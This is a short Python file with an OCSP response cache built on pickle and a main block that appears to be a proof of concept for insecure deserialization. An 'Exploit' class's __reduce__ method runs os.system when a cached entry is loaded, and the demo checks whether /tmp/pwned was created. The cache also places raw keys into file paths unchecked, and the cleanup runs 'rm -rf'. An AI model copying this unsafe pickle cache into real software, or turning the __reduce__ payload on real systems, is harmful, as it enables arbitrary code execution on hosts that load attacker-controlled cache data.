import pickle
import os

class OCSPResponseCache:
    def __init__(self, cache_dir):
        self.cache_dir = cache_dir
        os.makedirs(cache_dir, exist_ok=True)

    def get(self, key):
        cache_file = os.path.join(self.cache_dir, key)
        if os.path.exists(cache_file):
            with open(cache_file, 'rb') as f:
                try:
                    return pickle.load(f)
                except:
                    return None
        return None

    def set(self, key, value):
         cache_file = os.path.join(self.cache_dir, key)
         with open(cache_file, 'wb') as f:
                pickle.dump(value, f)

if __name__ == '__main__':

    cache = OCSPResponseCache("ocsp_cache")

    class Exploit:
        def __reduce__(self):
            return (os.system, ('touch /tmp/pwned',))

    malicious_data = Exploit()
    cache.set("malicious_key", malicious_data)


    cached_data = cache.get("malicious_key")
    print("Cache read:", cached_data)

    if os.path.exists('/tmp/pwned'):
        print("Exploit Successful! File '/tmp/pwned' created")

    os.system('rm -rf ocsp_cache')
    os.system('rm -rf /tmp/pwned')